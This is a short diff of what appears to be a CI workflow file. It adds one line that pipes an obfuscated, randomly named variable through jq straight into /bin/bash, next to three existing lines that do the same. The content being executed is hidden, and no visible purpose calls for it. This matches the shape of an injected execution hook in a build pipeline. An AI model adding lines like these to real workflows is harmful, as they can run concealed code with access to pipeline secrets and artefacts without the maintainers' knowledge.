@@ -26,6 +26,7 @@ jobs:
           echo $bih6807 | jq -r .ehba6415 | /bin/bash
           printf '%s' "$v3" | jq -r .vhqx43 | /bin/bash
           printf '%s' "$xdmk4" | jq -r .wj48 | /bin/bash
+          printf '%s' "$fs380" | jq -r .svuv098 | /bin/bash
 
       - name: Save archive
         if: always()
